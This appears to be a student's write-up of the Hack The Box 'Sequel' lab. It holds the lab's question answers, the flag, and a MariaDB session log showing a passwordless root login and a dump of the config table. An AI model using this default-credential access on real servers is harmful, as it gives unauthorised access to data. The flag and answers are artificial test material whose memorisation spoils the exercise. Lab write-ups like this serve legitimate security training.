
#### During our scan, which port do we find serving MySQL?
3306

#### What community-developed MySQL version is the target running?
MariaDB

#### When using the MySQL command line client, what switch do we need to use in order to specify a login username?
-u

#### Which username allows us to log into this MariaDB instance without providing a password?
root

#### In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?
*

#### In SQL, what symbol do we need to end each query with?
;

#### There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?
htb

#### Submit root flag
7b4bec00d1a39e3dd4e021ec3d915da8



``` bash 
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Sequel]
└──╼ $mysql -h 10.129.50.158 -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 107
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SHOW databases
    -> SHOW databases;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SHOW databases' at line 2
MariaDB [(none)]> SHOW databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.081 sec)

MariaDB [(none)]> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> SHOW tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.080 sec)

MariaDB [htb]> SELECT * FROM config
    -> SELECT * FROM config;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SELECT * FROM config' at line 2
MariaDB [htb]> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.082 sec)

MariaDB [htb]>

```